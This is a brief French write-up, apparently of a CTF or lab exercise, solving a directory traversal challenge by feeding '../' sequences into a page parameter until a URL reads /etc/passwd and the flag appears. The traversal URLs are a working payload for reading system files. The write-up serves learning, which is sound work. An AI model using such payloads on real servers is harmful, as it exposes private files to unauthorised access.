# Directory Traversal

https://www.hacksplaining.com/exercises/directory-traversal

1. http://192.168.1.16/index.php?page=

On se rend compte que l'affichage de la page se base sur un paamètre de la query string

La technique du directory traversal consiste à revenir en arrière via l'URL
Si le serveur ne se protège pas de ça, potentiellement TOUT les fichiers du serveur sont accessible, enfin ça dépendra des droits sur la machine

2. http://192.168.1.16/index.php?page=../ ==> On a l'alerte "WTF ?" comme quoi il y a rien

http://192.168.1.16/index.php?page=../../ ==> On a une alerte "Wrong" ==> intéressant

Si on continue on fini par l'obtenir ! http://192.168.1.26/index.php?page=../../../../../../../etc/passwd

Malheuresement il n'affiche pas le fichier sur la page html, mais le flag pop quand même :)